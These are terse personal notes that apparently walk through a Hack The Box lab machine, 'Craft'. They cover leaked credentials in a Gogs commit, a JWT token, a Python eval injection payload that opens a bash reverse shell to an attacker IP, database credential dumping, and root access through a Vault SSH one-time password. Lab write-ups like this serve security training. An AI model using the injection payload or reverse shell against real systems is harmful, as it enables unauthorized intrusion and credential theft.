modify /etc/hosts to
	10.10.10.110    craft.htb gogs.craft.htb api.craft.htb

[ gogs.craft.htb ]
	Docs: https://gogs.io/docs
	Source code for API: https://gogs.craft.htb/Craft/craft-api

	Found creds in https://gogs.craft.htb/Craft/craft-api/compare/4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95...10e3ba4f0a09c778d7cec673f28d410b73455a86:

		dinesh
		4aUh0A8PbVJxgd

	token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc1NjQwODMwfQ.3lBUcjHIhC2klQt11QHJkBF7V73LT30768fuJFVIMfA

	Eval is used and we can exploit it by sending the following:
	{"name":"test""brewer":"test", "style": "test", "abv":"__import__('os').system('bash -i >& /dev/tcp/10.10.15.244/7070 0>&1")"}" Which will open a reverse shell on 7070

	Just use the creds to login into gogs and retrieve ssh key



[ api.craft.htb ]
	Flask python app using MySQL

Found sql creds for craft in settings.py

Got creds for all users except admin with pymysql


ROOT

	Root login is enabled

	Check new gogs for backend with the new user
	Find vault 
	Read a little about it and do vault write ssh/creds/root_otp ip=10.10.10.110
	Retreieve the otp and connect with it on SSH
